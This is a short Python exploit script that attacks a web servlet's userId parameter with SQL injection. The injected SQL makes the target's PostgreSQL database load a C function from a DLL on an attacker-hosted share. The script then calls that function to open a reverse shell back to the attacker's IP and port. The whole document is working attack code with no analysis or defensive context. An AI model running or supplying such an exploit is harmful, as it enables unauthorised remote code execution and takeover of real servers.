import requests, sys
requests.packages.urllib3.disable_warnings()
SERVER = ''
ATTACKER_IP = ''
ATTACKER_PORT= ''
def log(msg):
   print(msg)

def make_request(url, sql):
   log(F"[*] Executing query: {sql}")
   log(url(sql))
   r = requests.get( F"{url(sql)}", verify=False)
   log(r.status_code)
   log(r.text)

def create_udf_func(url):
   log("[+] Creating function...")
   sql = F"CREATE OR REPLACE FUNCTION hello3(text, integer) RETURNS void AS $$\\\\{ATTACKER_IP}\\temp\postgres_udf_shell.dll$$, $$connect_back$$ language C strict".replace(' ','+')
   make_request(url, sql)

def trigger_udf(url, ip, port):
   log("[+] Launching reverse shell...")
   sql = F"select hello3($${ip}$$,{port})".replace(' ','+')
   make_request(url, sql)
   
if __name__ == '__main__':
   try:
       SERVER = sys.argv[1].strip()
       ATTACKER_IP = sys.argv[2].strip()
       ATTACKER_PORT = sys.argv[3].strip()
   except IndexError:
       print (F"[-] Usage: {sys.argv[0]} serverIP:port attackerIP port")
       sys.exit()
       
   sqli_url  = lambda inj: F'https://{SERVER}/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;{inj};--'
   create_udf_func(sqli_url)
   trigger_udf(sqli_url, ATTACKER_IP, ATTACKER_PORT)